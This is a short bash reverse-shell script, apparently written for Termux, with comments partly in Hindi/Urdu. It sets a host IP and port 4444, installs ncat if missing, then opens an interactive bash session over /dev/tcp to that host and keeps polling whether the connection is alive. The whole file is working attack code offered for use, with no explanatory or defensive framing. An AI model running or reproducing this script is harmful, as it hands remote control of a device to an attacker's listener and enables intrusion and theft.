#!/bin/bash

# Configuration
HOST="192.168.100.65"  # Apna server IP daal dein
PORT="4444"            # Port number

# Colors for better output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Check if netcat is installed
if ! command -v nc &> /dev/null; then
    echo -e "${RED}Error: Netcat not found. Installing...${NC}"
    pkg install ncat -y
fi

# Trap Ctrl+C to clean up
trap 'echo -e "${RED}Connection terminated${NC}"; kill 0' INT

# Start reverse shell
echo -e "${GREEN}Connecting to $HOST:$PORT${NC}"
bash -i > /dev/tcp/$HOST/$PORT 0<&1 2>&1 & pid=$!

# Minimal monitoring
while true; do
    if ! ps | grep -q $pid; then
        echo -e "${RED}Connection lost${NC}"
        exit 1
    fi
    sleep 2
done
